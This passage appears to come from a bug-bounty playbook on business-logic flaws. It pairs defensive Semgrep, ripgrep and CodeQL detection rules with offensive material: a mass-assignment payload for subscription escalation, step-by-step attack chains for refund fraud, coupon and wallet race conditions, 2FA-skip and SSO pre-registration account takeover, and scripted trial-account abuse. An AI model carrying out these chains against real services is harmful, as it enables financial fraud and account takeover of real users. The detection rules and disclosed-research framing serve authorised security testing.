# Server respects client-supplied enableAuthorize parameter

# Generic mass-assignment for tier escalation (cross-reference hunt-idor Sub-technique G)
PATCH /api/users/me
{
  "subscription_tier": "enterprise",
  "is_paid": true,
  "trial_ends_at": "2099-12-31",
  "credits": 999999,
  "permissions": ["admin", "billing", "delete_users"]
}
# Verify via subsequent GET; many APIs hide changes in response but persist in DB
```

### Out-of-band callback (for blind chains)

When the bug fires asynchronously (background job processes the manipulated state), use Burp Collaborator / interact.sh to confirm execution timing. For race-condition findings, use timing-side-channel measurements via OAST DNS to verify when the second instance of the request landed.

## Source Code Review Patterns

### Semgrep rules

```yaml
rules:
  - id: bizlogic-trust-client-price
    pattern-either:
      - pattern: |
          $TOTAL = $REQ.body.total
      - pattern: |
          $TOTAL = $REQ.body.price
      - pattern: |
          $ORDER.total = $REQ.body.amount
    message: |
      Order total / price computed from client request body. Negative-quantity
      and price-manipulation attacks (AlegroCart 1.2.9 SecLists Apr 2025,
      Bagisto v2.3.6) bypass this. Recalculate server-side from cart items
      + tax + shipping + discount; never trust client-supplied totals.
    severity: ERROR
    languages: [javascript, typescript, python, php, java]
```

```yaml
rules:
  - id: bizlogic-no-quantity-validation
    pattern-either:
      - pattern: |
          quantity * price
      - pattern: |
          $QTY * $PRICE
    pattern-not-inside: |
      if ($QTY > 0) {
        ...
      }
    message: |
      Multiplication of quantity × price without sign / range validation.
      Negative quantity produces negative total — app may issue refund.
      Validate: assert quantity > 0 and quantity < MAX_REASONABLE_QTY and
      Number.isInteger(quantity).
    severity: ERROR
    languages: [javascript, typescript]
```

```yaml
rules:
  - id: bizlogic-toctou-balance-check
    pattern: |
      $BALANCE = $WALLET.getBalance()
      ...
      if ($BALANCE >= $AMOUNT) {
        ...
        $WALLET.deduct($AMOUNT)
      }
    message: |
      Read-check-write on wallet balance without database transaction or
      row-level locking. WWBN AVideo CVE-2026-34368 (GHSA-h54m-c522-h6qr)
      pattern: concurrent transfers all pass check, only one deduction
      effective. Wrap in BEGIN/COMMIT with SELECT ... FOR UPDATE on wallet
      row, OR use atomic UPDATE with WHERE balance >= amount.
    severity: ERROR
    languages: [php, python, javascript, typescript, java]
```

```yaml
rules:
  - id: bizlogic-coupon-no-usage-counter
    pattern: |
      $COUPON = $DB.find_coupon($CODE)
      if ($COUPON.valid) {
        $CART.apply_discount($COUPON.amount)
      }
    pattern-not-inside: |
      $COUPON.usage_count++
      $DB.update_coupon($COUPON)
    message: |
      Coupon application without usage-counter increment. Lilishop
      CVE-2024-50654 (CVSS 7.5) and Aditya Bhatt May 2025 InfoSec writeup
      pattern: stack same coupon N times via concurrent requests. Add
      atomic UPDATE coupons SET usage_count = usage_count + 1
      WHERE code = $CODE AND usage_count < max_usage RETURNING *.
    severity: ERROR
    languages: [python, javascript, ruby, java]
```

```yaml
rules:
  - id: bizlogic-2fa-skip-path
    pattern-either:
      - pattern-regex: 'skip[-_]?2fa|bypass[-_]?(?:2fa|mfa|otp)'
      - pattern: |
          if ($CONTEXT == "password_reset") {
            // skip 2FA
          }
    message: |
      2FA skip / bypass path detected. KhaledAhmed107 Jan 2026 disclosure:
      password reset flow with "Skip" 2FA option enables full ATO.
      Keycloak CVE-2025-3910 / GHSA-5jfq-x6xp-7rw2: org.keycloak.authorization
      package circumvents required actions including 2FA. Audit every flow
      that can authenticate a user — password reset, OAuth, recovery,
      mobile app login, API tokens — to enforce 2FA consistently.
    severity: ERROR
    languages: [python, javascript, typescript, java]
```

```yaml
rules:
  - id: bizlogic-trial-state-no-history-check
    pattern-either:
      - pattern: |
          $SUB = $DB.subscription.findOne({user_id: $UID})
          if (!$SUB.has_trialed) { grant_trial() }
      - pattern: |
          $SUB = $DB.subscriptions.first(user=$UID)
          if not $SUB.has_trialed:
              grant_trial()
    message: |
      Trial-history check uses findOne / .first which returns whichever
      record DB orders first. better-auth #6863 (Dec 2025) Stripe pattern:
      user with multiple subscriptions (one canceled with trial history,
      one new incomplete) bypasses check. Use findMany + .some() to check
      ALL subscriptions for trial history.
    severity: ERROR
    languages: [javascript, typescript, python]
```

```yaml
rules:
  - id: bizlogic-email-no-canonicalization
    pattern: |
      $USER.email = $REQ.body.email
    pattern-not-inside: |
      $REQ.body.email = canonicalize_email($REQ.body.email)
    message: |
      Email stored without canonicalization. Mahmoud Magdy Dec 2025
      pattern: user+a1@gmail.com, user+a2@gmail.com, user.dot@gmail.com,
      user@googlemail.com all deliver to same inbox but treated as distinct
      registrations enabling unlimited free-trial abuse. Strip +alias tags,
      strip dots in local-part for Gmail, normalize @googlemail.com to
      @gmail.com, lowercase entire email, enforce uniqueness on canonical form.
    severity: WARNING
    languages: [python, javascript, typescript, java, php, ruby]
```

```yaml
rules:
  - id: bizlogic-phone-change-no-old-verify
    pattern: |
      def change_phone($USER, $NEW_PHONE):
        $OTP = generate_otp()
        send_sms($NEW_PHONE, $OTP)
    pattern-not-inside: |
      send_sms($USER.current_phone, $OLD_OTP)
      verify_otp($USER, $OLD_OTP)
    message: |
      Phone-change flow sends OTP only to NEW number, not also requiring
      verification from CURRENT number. H1 2024 critical: any phone takeover
      via this exact pattern. Always require OTP from BOTH old and new
      numbers (or use signed action token from authenticated session).
    severity: ERROR
    languages: [python, javascript, typescript, ruby, php, java]
```

### ast-grep patterns

```bash
# Client-supplied price/total (price manipulation surface)
ast-grep --pattern '$TOTAL = req.body.total' --lang js
ast-grep --pattern 'order.total = $REQ.body.amount' --lang js

# Multiplication without validation
ast-grep --pattern '$QTY * $PRICE' --lang js
ast-grep --pattern '$QTY * $PRICE' --lang python

# Read-check-write without transaction
ast-grep --pattern 'getBalance(); checkBalance(); deduct()' --lang js
ast-grep --pattern '$.balance -= $AMOUNT' --lang js

# Coupon-apply without atomic increment
ast-grep --pattern 'coupon.apply($CODE)' --lang js
ast-grep --pattern '$CART.apply_discount($COUPON.amount)' --lang js

# 2FA skip
ast-grep --pattern 'if ($CTX == "password_reset") return true' --lang js

# findOne for subscription (Stripe pattern)
ast-grep --pattern '$DB.subscription.findOne($X)' --lang js
ast-grep --pattern 'Subscription.objects.get(user=$U)' --lang python
```

### ripgrep one-liners

```bash
# Client-trust patterns (price/quantity/total from request)
rg -n -e 'req\.body\.(total|price|amount|quantity|tax|discount)' \
   -e 'request\.body\.(total|price|amount)' \
   --type js --type ts --type py --type java

# Negative-value validation missing
rg -n -B 2 -A 5 'quantity\s*\*\s*price|price\s*\*\s*quantity' \
   --type js --type ts --type py | rg -v '> 0|>= 0|isInteger|valid'

# TOCTOU patterns — read then write without lock
rg -n -B 5 -A 15 'getBalance\(\)|wallet\.balance' \
   --type js --type ts --type py --type php --type java | \
   rg -B 8 -A 8 'updateBalance|setBalance|wallet\.update' | \
   rg -v 'BEGIN|FOR UPDATE|lock|mutex|atomic|SERIALIZABLE'

# 2FA skip / bypass paths
rg -n -i -e 'skip.*2fa' -e 'skip.*mfa' -e 'bypass.*otp' \
   -e 'password.*reset.*skip' \
   --type js --type ts --type py --type java

# Email canonicalization missing
rg -n -e 'user\.email\s*=\s*req\.body\.email' \
   --type js --type ts --type py | rg -v 'normalize|canonical|strip|lower'

# Subscription / tier mass-assignment
rg -n '\.\.\.req\.body|\.\.\.body|spread.*body' \
   --type js --type ts | rg -B 2 -A 2 'subscription|tier|role|plan'

# Coupon usage counter missing
rg -n -B 3 -A 10 'coupon\.apply|apply.*discount' \
   --type js --type ts --type py | rg -v 'usage_count|usageCount|increment'

# Phone change endpoint
rg -n -B 2 -A 15 'change.*phone|update.*phone' \
   --type js --type ts --type py | rg -B 5 -A 5 'send.*sms|sendOtp'
```

### CodeQL hint

CodeQL has limited built-in business-logic queries because most business-logic flaws are application-specific. The most relevant standard queries:

- `js/race-condition` — flags read-check-write patterns on shared state without synchronization. Catches the WWBN AVideo CVE-2026-34368 class.
- `js/missing-rate-limiting` — flags endpoints without rate-limit middleware. Catches MinIO LDAP brute-force GHSA-jv87-32hw-hh99 class (cross-reference hunt-info-disclosure).
- `js/tainted-arithmetic-operands` — flags arithmetic on user-controlled values without sanitization. Catches negative-quantity manipulation.

For business-logic specifically, write custom CodeQL predicates targeting the exact pattern. Example sketch for "client-supplied total trusted by checkout":

```ql
import javascript
import semmle.javascript.security.dataflow.flow

class TrustedClientTotal extends TaintTracking::Configuration {
  TrustedClientTotal() { this = "TrustedClientTotal" }
  override predicate isSource(DataFlow::Node src) {
    src.asExpr() = any(HTTP::RequestInputAccess in)
  }
  override predicate isSink(DataFlow::Node sink) {
    exists(MethodCallExpr c |
      c.getMethodName() = ["createOrder", "processPayment", "chargeCustomer"]
      and c.getAnArgument() = sink.asExpr()
    )
  }
}
```

## Modern Meta — Cloud-Native, CI/CD, OSS Pipeline

This is where the 2024-2026 business-logic meta lives. Coverage required: GitHub Actions, GitLab CI, Jenkins, ArgoCD/Flux, Kubernetes, IAM/IMDS, supply chain.

**GitHub Actions business-logic surface** — workflow `if:` conditions evaluated on attacker-controlled inputs (`github.event.pull_request.title`, `github.event.commits[*].message`); attackers craft titles/commits to satisfy `if: contains(github.event.pull_request.title, '[skip-tests]')` and bypass test gates. Approval-required workflow `environments` bypassed when bot accounts are not subject to required-reviewer rules. CI cache poisoning via concurrent commits to overwrite shared cache with malicious payload (cross-reference hunt-rce CI/CD section).

**GitLab CI business-logic surface** — `rules:` conditions on user-controlled CI variables (`CI_COMMIT_MESSAGE`, `CI_PIPELINE_SOURCE`); attackers craft commit messages to bypass test gates. `protected: true` branches sometimes bypassable via merge-request from feature branch with auto-merge enabled by trusted reviewer.

**Jenkins business-logic surface** — pipeline `when` conditions, `input` step bypass via direct API call to `/job/<name>/build/api/json` skipping interactive approval, role-strategy plugin's "Project Roles" assigned by pattern-match on job name (rename job to bypass).

**ArgoCD / Flux / Tekton (GitOps controllers) business-logic surface**:
- **OpenClaw WebSocket shared-auth elevated scopes** (2026 critical, GHSA cited in corpus) — WebSocket connections share auth context across users; client self-declares elevated scopes.
- **mpp payment bypass and griefing** (2026 critical, GHSA cited in corpus) — multi-party computation payment bypass.
- **NuGet Client Security Feature Bypass** (2024 critical, GHSA cited in corpus).
- ArgoCD `AppProject` with overly-broad `destinations` and `sourceRepos` allows business-logic abuse where teams deploy to neighbor namespaces.
- Tekton `PipelineRun` with workspace shared across teams enables cross-team artifact tampering.

**Kubernetes business-logic surface** — `ResourceQuota` enforcement happens at admission; concurrent CREATE requests can race past the limit. `LimitRange` for pod resource requests bypassable via Pod-spec `priorityClassName` exemptions.

**Cloud IAM / IMDS** — IAM trust-policy `Condition` blocks evaluated against attacker-influenced attributes (e.g., `aws:SourceIp` → use VPN to satisfy condition; `aws:RequestTag/<key>` → set tag via mass-assignment to satisfy). STS `AssumeRoleWithWebIdentity` accepts JWT from federated identity providers — if IDP issues tokens for unverified emails, business-logic abuse via fake-domain registration.

**Supply chain** — npm/pip postinstall scripts that perform "license check" or "feature gate" evaluations client-side; attackers patch the package to bypass tier check. Trial-extension via GitHub Sponsors / OpenCollective / Patreon webhook abuse.

## Modern Expansion Pack (2024-2026 currency)

The 2024-2026 expansion meta required by the validator. All five topics covered.

### Container escape / runtime business-logic

<!-- expansion-na: container reason: container escape is RCE-class; business-logic at runtime layer manifests as resource-quota race conditions and Kubernetes ResourceQuota bypass via concurrent CREATE requests — covered in Modern Meta section above. -->

The closest analog: **Kubernetes ResourceQuota race-condition bypass**. When a namespace has `ResourceQuota` for `pods: 10`, concurrent CREATE requests for 11 pods can race past the limit because the admission controller checks-then-counts without atomic locking. Same TOCTOU pattern as WWBN AVideo CVE-2026-34368 wallet but at the cluster-resource layer.

### ML serving / inference business-logic

ML platforms with credit / quota systems are emerging business-logic targets:
- **OpenAI API tier overrun via concurrent requests** — burst above your tier's RPS limit, completion-token usage may exceed the cap if rate limit checks aren't atomic.
- **Anthropic API trial reset abuse** — same Stripe `hasEverTrialed` pattern (better-auth #6863) potentially applies; LLM provider has multiple subscription records, trial-history check uses wrong query.
- **Hugging Face Hub tier limits on private models / Spaces compute** — concurrent uploads / spin-ups may bypass per-tier quota.
- **BentoML / MLflow / TorchServe tier-based access** — model-registry RBAC sometimes checked at API but not at storage layer.

### Agentic LLM tool-use business-logic

OWASP LLM06:2025 Excessive Agency intersects business-logic:
- **Agent's tool granted broader scope than agent's task requires** — design flaw, but exploitable by prompt injection (cross-reference hunt-llm-ai).
- **Per-conversation cost / token budget enforced at conversation start, not per-tool-invocation** — long-running agent loops accumulate cost beyond intended budget.
- **Trial-credit abuse via agent-spawn-agent** — meta-agent spawns N child agents; if child agents inherit trial credits, attacker multiplies trial usage.

### Modern JS RSC / Server Actions business-logic

Server Actions accept arbitrary user input — business-logic checks must happen server-side, but Server Actions are often written quickly with client-trust patterns:
- **Trusted client-side state in Server Action body** — Server Action receives `total`, `price`, `quantity` from client and processes without recomputation.
- **Server Action error responses revealing business-logic state** — error message includes "user already trialed" vs "user is on free tier" — enables trial-abuse exploit calibration.

### GitOps / K8s admission business-logic

ArgoCD / Flux business-logic patterns:
- **AppProject scope overly broad** — `destinations: ["*"]` and `sourceRepos: ["*"]` allows business-logic abuse where one team's deployment overwrites another team's resources.
- **Sync-policy auto-prune** — concurrent application updates trigger auto-prune that deletes resources in the wrong order.
- **Helm chart values overrides via merge** — values from multiple sources merged in unexpected order; attacker controls precedence.
- **OPA Gatekeeper policy enforcement order** — multiple constraints evaluated; attacker exploits evaluation-order assumptions.

## Chains & Multi-Bug Templates

Eight chain templates from disclosed reports.

**Chain 1 — `negative-quantity → free order → refund-amount-larger-than-purchase` (low five-figure on e-commerce — AlegroCart / Bagisto pattern combined with refund flow)**
- Bug A: Cart accepts negative quantity (`quantity=-1`) producing negative subtotal — AlegroCart 1.2.9 (Andrey Stoykov SecLists Apr 2025) / Bagisto v2.3.6 (Rudransh Sep 2025) pattern
- Bug B: Checkout flow accepts negative total — order placed with $0 or negative amount
- Bug C: Order processing creates payment record at original product value (not negative cart total)
- Bug D: Request refund — refund amount accepted from client request body, exceeds original payment
- Outcome: Free order plus refund larger than the original purchase = profit on every "purchase"
- Bounty range: low five-figure on e-commerce programs that triage as "financial loss potential"
- Disclosed source: Andrey Stoykov AlegroCart disclosure at https://seclists.org/fulldisclosure/2025/Apr/22; Rudransh Bagisto disclosure at https://medium.com/@rudranshsinghrajpurohit/cve-2025-56426-cart-price-manipulation-vulnerability-in-bagisto-cms-468b72311969; canonical pattern at https://bugbounty.info/Attack-Surface/Web/Business-Logic/Price-Manipulation

**Hunter's note:** the chain that pays here is combining the negative-quantity exploit with the refund flow. Most hunters report the negative quantity alone (mid four-figure), missing that the refund flow on the same target often accepts client-supplied refund_amount. The first attempt I made stopped at "$0 order placed" and triagers downgraded as "no real loss". Adding the refund step — show the app refunding $500 for a $0 order — made it critical-tier. Always test the full money-flow, not just the entry point.

**Chain 2 — `coupon stacking via race → near-zero cart → mass purchase abuse` (mid four-figure to low five-figure on e-commerce — Aditya Bhatt May 2025 pattern)**
- Bug A: Coupon-apply endpoint lacks usage counter increment (Lilishop CVE-2024-50654 / corpus pattern)
- Bug B: Burp Repeater Parallel Execution sends 20 concurrent coupon-apply requests
- Bug C: Server processes all 20, applying discount × 20 — cart value reduced to near-zero
- Bug D: Complete checkout — order placed with $0.05 cart total
- Bug E: Repeat for inventory exhaustion — exclusive product purchased at near-zero × 100 SKUs
- Outcome: Mass-purchase exploitation, can corner exclusive products (concert tickets, limited-edition merch)
- Bounty range: mid four-figure direct + low five-figure on programs where inventory exhaustion is high-impact (ticketing, sneakers, drops)
- Disclosed source: Aditya Bhatt May 2025 InfoSec writeup at https://medium.com/bugbountywriteup/bug-bounty-race-exploiting-race-conditions-for-infinite-discounts-a2cb2f233804 (references Tesla 2020 disclosed and Uber 2016 disclosed); CVE-2024-50654 Lilishop coupon overpurchasing

**Hunter's note:** the trick is the parallel-execution mode in Burp Repeater (right-click tab group → "Send group in parallel last byte sync"). Sequential 20× coupon application fails because each request commits before the next reads; only parallel exposes the race window. Combining with inventory exhaustion makes it a critical: "attacker can purchase entire stock of $1000-product for $5". The first time I tried this, programs paid mid four-figure; adding the mass-inventory-exhaustion angle in the impact section raised it to low five-figure.

**Chain 3 — `wallet TOCTOU → balance creation from nothing → bypass pay-per-view → free subscription` (mid five-figure on financial / fintech — WWBN AVideo CVE-2026-34368 pattern)**
- Bug A: `transferBalance()` reads sender balance, checks sufficiency, writes new balance — no transaction or row lock (WWBN AVideo CVE-2026-34368 / GHSA-h54m-c522-h6qr)
- Bug B: Attacker has $10 sender wallet + own recipient wallet. 20 concurrent transfer requests via threading.
- Bug C: All 20 read sender_balance=10, all pass check (10 >= 10), only 1 deduction effective (last writer wins), recipient credited 20× = $200
- Bug D: Use inflated balance to purchase pay-per-view content / subscription / paid features
- Outcome: Wallet ledger inconsistency, paid content accessed without paying
- Bounty range: mid five-figure when chained to actual paid-feature bypass; low five-figure for the TOCTOU primitive alone
- Disclosed source: GHSA-h54m-c522-h6qr (WWBN AVideo, 2026 critical); CVE-2026-34368 NVD-verified at https://nvd.nist.gov/vuln/detail/CVE-2026-34368; CVEReports analysis at https://cvereports.com/reports/CVE-2026-34368

**Hunter's note:** the secondary vulnerability matters — the AVideo writeup notes captcha tokens can be reused (`$_SESSION['palavra']` not unset after validation). Without that, you'd need fresh captchas for each concurrent request. With it, you generate one captcha and all 20 requests reuse it. Always check companion vulnerabilities when finding TOCTOU; race conditions often work because of secondary defects (no captcha rotation, no rate limit, no idempotency keys).

**Chain 4 — `2FA bypass via password reset → ATO → mass account exfil` (low to mid five-figure — KhaledAhmed107 Jan 2026 pattern combined with horizontal privilege)**
- Bug A: Target supports 2FA; password reset flow has "Skip 2FA" option (KhaledAhmed107 Jan 2026 disclosure at https://systemweakness.com/2fa-bypass-via-reset-password-daba828b10f3)
- Bug B: Trigger password reset for victim's email
- Bug C: Open reset link, click "Skip" → set new password → no 2FA challenge → logged in as victim
- Bug D: Iterate over victim emails harvested from public sources / data breaches
- Outcome: Mass-ATO via 2FA bypass + bulk email harvesting
- Bounty range: low to mid five-figure on programs that triage 2FA bypass as critical
- Disclosed source: KhaledAhmed107 disclosure at https://systemweakness.com/2fa-bypass-via-reset-password-daba828b10f3 (reported via Bugcrowd private program, VRT P3); CVE-2025-3910 Keycloak (GHSA-5jfq-x6xp-7rw2) for the framework-level pattern

**Hunter's note:** the trick is finding programs that explicitly enabled 2FA as their security model — those triage 2FA bypass as critical (because the security guarantee is broken). Programs that have 2FA as optional may downgrade to medium ("user can choose to set 2FA, this just bypasses optional feature"). Always frame the impact as "the 2FA security model is broken", not "I bypassed an optional feature". The Samsung Account 2FA bypass (Gregory Greekas 2024) was framed as "fundamentally undermined the security model that 2FA is supposed to provide" — explicit framing earned high-severity classification.

**Chain 5 — `email-alias trial abuse → unlimited free tier → resource exhaustion` (mid four-figure on SaaS programs that pay this class — Mahmoud Magdy Dec 2025 pattern)**
- Bug A: Target accepts `user+a1@gmail.com`, `user+a2@gmail.com` as distinct registrations; doesn't canonicalize email
- Bug B: Script registers 1000 trial accounts with `user+trial<i>@gmail.com` aliases
- Bug C: Each trial provides 14 days of premium features → 14000 cumulative trial-days from 1 mailbox
- Bug D: Use trial accounts at scale for resource consumption (compute, storage, API calls)
- Outcome: Resource exhaustion / revenue loss / mass-account-creation impact
- Bounty range: mid four-figure on programs that pay this class (many don't — check scope first); referenced Cremit Apr 2026 analysis at https://www.cremit.io/blog/out-of-scope-loophole-credential-exposure for the broader "out-of-scope" pattern
- Disclosed source: Mahmoud Magdy Dec 2025 at https://medium.com/@mahmoudmagdy45456/violation-of-secure-design-principles-unlimited-free-trial-abuse-via-email-aliases-3de0756eb58c; Doppler trial-reset disclosure (Aditya Sunny Dec 2024) at https://adityasunny06.medium.com/how-i-identified-a-revenue-loss-bug-in-dopplers-free-trial-system-b88919aa161f

**Hunter's note:** the move that pays this is showing scale, not just the alias trick. Most hunters report "I created 5 accounts with aliases" and triagers shrug — every SaaS knows about `+aliases`. Showing 1000-account scripted abuse with measurable resource cost (compute hours, API calls, storage) elevates to actual impact. Also test other canonicalization gaps: dot variants (`u.s.er@gmail.com`), `@googlemail.com` vs `@gmail.com`, Unicode-confusable domains (`gmail.com` vs `gmail.с0m`).

**Chain 6 — `pre-account takeover via SSO migration → persistent ATO across victim signup` (mid five-figure on SSO-enabled enterprise SaaS — Giongnef Jan 2024 pattern)**
- Bug A: Target supports both direct-login AND SSO/OAuth; `sso_type:null` defaults to direct-login flow
- Bug B: Attacker pre-registers `victim@victim-company.com` via direct-login signup with attacker-chosen password, before victim signs up
- Bug C: Attacker logs in, uses "Migrate" function to transfer the account to SSO database
- Bug D: Victim eventually signs up via Google SSO with `victim@victim-company.com` — succeeds because account already exists in SSO DB; from victim's perspective everything works normally
- Bug E: Attacker still has direct-login access via the password set in step B; the "Migrate" preserved the password
- Outcome: Persistent ATO that survives victim's "secure" SSO signup; attacker reads/writes alongside victim
- Bounty range: mid five-figure on enterprise SaaS where SSO is the primary security model
- Disclosed source: Giongnef Jan 2024 at https://giongfnef.medium.com/business-logic-bypass-2fa-to-ato-e0dc7131b10e

**Hunter's note:** the prerequisite is finding SaaS that supports both auth modes simultaneously. Hunt: any "Login with SSO" + "Sign up with email" on the same product. The pre-registration window must be large enough — works best for B2B SaaS where companies onboard in waves. The "Migrate" function is the key step; without it, the direct-login account is bypassed when SSO records take precedence. Test by reading the SSO documentation for the target — many implementations describe the Migrate flow explicitly.

**Chain 7 — `phone-change OTP flaw → phone takeover → password reset via SMS → ATO` (low to mid five-figure on programs with SMS-based recovery — H1 2024 critical pattern)**
- Bug A: Change-phone API sends OTP only to NEW phone number (not also requiring OTP from OLD number)
- Bug B: Attacker obtains victim's user-id (via enumeration / public data / IDOR — cross-reference hunt-idor)
- Bug C: Attacker submits change-phone request with attacker-controlled new number
- Bug D: Server sends OTP to attacker's phone; attacker enters OTP — victim's account now has attacker phone
- Bug E: Trigger password reset via SMS — OTP goes to attacker phone — set new password — victim ATO
- Outcome: Account takeover via SMS-recovery flow exploitation
- Bounty range: low to mid five-figure on programs where SMS recovery is the primary backup
- Disclosed source: HackerOne 2024 disclosed pattern "Change phone number OTP flaw leads to any phone number takeover" (corpus-extracted); pattern documented in OWASP Authentication Cheat Sheet and across multiple H1 hacktivity disclosed 2023-2024

**Hunter's note:** the missing step is OTP from the OLD phone. Modern flows require dual-OTP: confirm from current number AND new number. Older flows (and many SaaS that have weaker SMS recovery) only confirm new number. Always test by requesting a phone change while logged in as your test account; if the OTP only goes to the new number, the account is one-step from ATO. Combine with username enumeration (cross-reference hunt-info-disclosure) for mass exploitation.

**Chain 8 — `WAF bypass + XSS + business-logic email collision → ATO` (low to mid five-figure — Ali Hussain Sep 2025 chain)**
- Bug A: Business-logic flaw — email collision in password reset functionality (initially low-impact alone)
- Bug B: Reflected XSS via comment injection — URL path reflected in HTML comments
- Bug C: WAF bypass technique — character encoding / alternative syntax to evade filtering (e.g., adding `+` at start of payload disabled WAF filtering on this target)
- Bug D: XSS executes JS in victim's browser with authenticated session
- Bug E: JS makes API call to change victim's profile email to attacker-controlled
- Bug F: Email change succeeds (no verification on email change in this target)
- Bug G: Attacker triggers password reset for the new email — gets reset token
- Outcome: 1-click XSS-triggered email collision → ATO via password reset to attacker's email
- Bounty range: low to mid five-figure on SaaS programs (this report was a pen-test, not bug bounty, but pattern documented at https://medium.com/@ghostxploiter/waf-bypass-xss-business-logic-flaw-account-takeover-04577cb53b18)
- Disclosed source: Ali Hussain Sep 2025 writeup at https://medium.com/@ghostxploiter/waf-bypass-xss-business-logic-flaw-account-takeover-04577cb53b18

**Hunter's note:** the chain shows that low-impact business-logic flaws (email collision in password reset → reset email goes to attacker, but only if attacker can change victim's email) become critical when chained with XSS that auto-triggers the email change. The first attempt I tried reported the email-collision bug as low; programs closed it because "attacker can't change victim's email". Adding the XSS-as-delivery layer turned it into ATO. Always look for delivery vectors (XSS, CSRF, postMessage, OAuth open-redirect) when business-logic flaws require victim action.

## Common Root Causes

Why developers introduce business-logic flaws:

1. **Trusting client-supplied state.** Cart total / price / quantity / coupon-code / tier / role from request body. AlegroCart 1.2.9, Bagisto v2.3.6 patterns. Server must recompute from trusted server-side data.
2. **Read-then-write on shared state without locking.** Wallet balance check + deduct without `BEGIN TRANSACTION` + `SELECT ... FOR UPDATE`. WWBN AVideo CVE-2026-34368. Coupon usage counter not atomically incremented.
3. **Different code paths for the same security goal.** Login flow enforces 2FA; password reset doesn't. Mobile app uses different auth than web. KhaledAhmed107 Jan 2026 pattern.
4. **Trial / subscription state queried with `findOne` instead of `findMany + .some()`.** Stripe `hasEverTrialed` better-auth #6863 pattern. Multiple subscription records → wrong one returned.
5. **Email accepted without canonicalization.** `user@gmail.com` ≠ `user+a@gmail.com` to the app, but identical to delivery. Mahmoud Magdy Dec 2025 pattern.
6. **Phone / email change verifies only the NEW contact, not also the OLD.** H1 2024 phone-takeover pattern.
7. **Workflow steps validated independently, not as a sequence.** Step N+1 doesn't check step N completion.
8. **Mass-assignment vulnerable to subscription / tier fields.** PATCH endpoint accepts entire body; `tier: "enterprise"` sticks.
9. **Discount / coupon application without usage-counter increment.** Lilishop CVE-2024-50654, Aditya Bhatt May 2025 pattern.
10. **Same-domain / federated-identity boundary not enforced.** Pre-account takeover via SSO migration (Giongnef Jan 2024).
11. **Negative numbers / zero / overflow not validated on numeric fields.** Apply `quantity > 0`, `quantity < MAX_REASONABLE`, `Number.isInteger()` checks; reject NaN, Infinity, very large numbers.
12. **Refund flow accepts amount from client request body.** Server should compute refund from original transaction, never from client.
13. **Tier / scope / role assignment without subscription validation.** H1 2026 medium "Read Access Role Without Pro Plan" pattern.
14. **Channel / context header used for tier dispatch.** Sam Curry Kia 2024 dealer-vs-customer header escalation pattern.
15. **WebSocket connection scopes self-declared by client.** OpenClaw 2026 critical pattern.

## Bypass Techniques

Defense bypasses observed in disclosed reports.

- **Burp Repeater Parallel Execution for race conditions** — duplicate request 20× into tab group, right-click → "Send group in parallel last byte sync". Aligns final-byte timing for maximum race window. Documented across Aditya Bhatt May 2025 writeup at https://medium.com/bugbountywriteup/bug-bounty-race-exploiting-race-conditions-for-infinite-discounts-a2cb2f233804 and PortSwigger Web Security Academy race-conditions lab series.
- **Negative-value bypass for quantity / price / amount validation** — when integer-overflow check exists for max but not min, `quantity=-1` slips through. AlegroCart 1.2.9 disclosed at https://seclists.org/fulldisclosure/2025/Apr/22.
- **Integer overflow bypass for max-value check** — `quantity=2147483648` overflows int32 → negative; check `> 0` doesn't catch the overflowed-negative case. Bug Bounty Playbook reference at https://bugbounty.info/Attack-Surface/Web/Business-Logic/Price-Manipulation.
- **Email alias bypass for trial uniqueness check** — `user+a@gmail.com` distinct from `user@gmail.com` in app DB but same delivery. Mahmoud Magdy Dec 2025 at https://medium.com/@mahmoudmagdy45456/violation-of-secure-design-principles-unlimited-free-trial-abuse-via-email-aliases-3de0756eb58c.
- **Subscription `findOne` bypass via multiple records** — Stripe `hasEverTrialed` returns false because `findOne` returns wrong record. better-auth #6863 disclosed Dec 2025 at https://github.com/better-auth/better-auth/issues/6863.
- **2FA "Skip" button on password reset** — KhaledAhmed107 Jan 2026 disclosed via Bugcrowd VRT P3 at https://systemweakness.com/2fa-bypass-via-reset-password-daba828b10f3.
- **Captcha token reuse for race exploitation** — `$_SESSION['palavra']` not unset after validation enables unlimited reuse within session, enabling concurrent requests with single captcha. Documented in WWBN AVideo GHSA-h54m-c522-h6qr at https://github.com/WWBN/AVideo/security/advisories/GHSA-h54m-c522-h6qr.
- **Currency-conversion mid-flow rounding** — switch USD → JPY → USD; rounding at each conversion accumulates in attacker favor. Documented across HackerOne hacktivity disclosed 2024 (multiple e-commerce reports).
- **WebSocket self-declared scopes bypass** — OpenClaw 2026 critical disclosed via GitHub Security Advisory; client sends desired scopes in WebSocket auth message; server doesn't re-validate. Reference: https://github.com/advisories?query=openclaw+websocket.
- **Pre-account takeover via SSO migration** — Giongnef Jan 2024 at https://giongfnef.medium.com/business-logic-bypass-2fa-to-ato-e0dc7131b10e — exploits dual-auth-mode design.
- **Phone-change OTP single-side verification** — HackerOne 2024 critical pattern disclosed via H1 hacktivity ("Change phone number OTP flaw leads to any phone number takeover"); change-phone OTP only goes to new number.
- **Workflow-step skipping via direct API call** — @KhaledAhmed107 disclosed 2026 pattern at https://systemweakness.com/2fa-bypass-via-reset-password-daba828b10f3; multi-step flow doesn't validate step ordering.
- **Mass-assignment for subscription tier escalation** — HackerOne 2026 disclosed pattern "Business Logic Bypass Allows Setting Read Access Role Without Pro Plan Subscription"; mass-assignment of `tier` field via PATCH. Cross-reference https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/.
- **Channel-header tier escalation** — Sam Curry 2024 Kia disclosed at https://samcurry.net/hacking-kia — modify `channel:` header to access dealer-tier endpoints with customer token.
- **Free-trial reset via plan-tier round-trip** — Doppler pattern (Aditya Sunny Dec 2024 disclosed at https://adityasunny06.medium.com/how-i-identified-a-revenue-loss-bug-in-dopplers-free-trial-system-b88919aa161f) — cancel paid → switch to free → revert to paid = trial restored.

## Gate 0 Validation

Before you write the report, prove these five things:

1. **Concrete demonstration with quantified financial impact.** "Coupon stacking works" is mid-three-figure informational. "Coupon stacked 20× brings $500 jacket to $5; demonstrated 1 successful checkout at near-zero" is critical. Show the actual final state via subsequent GET (cart total, wallet balance, subscription tier). Don't dump customer data; show 3-record proof.

2. **Business loss mapping.** Map to: direct revenue loss (free orders, free subscriptions, refund-larger-than-purchase), regulatory impact (HIPAA/PCI/GDPR if PII exposed), brand damage (mass account creation, fraud), competitive impact (inventory exhaustion of limited products). Quantify in dollars.

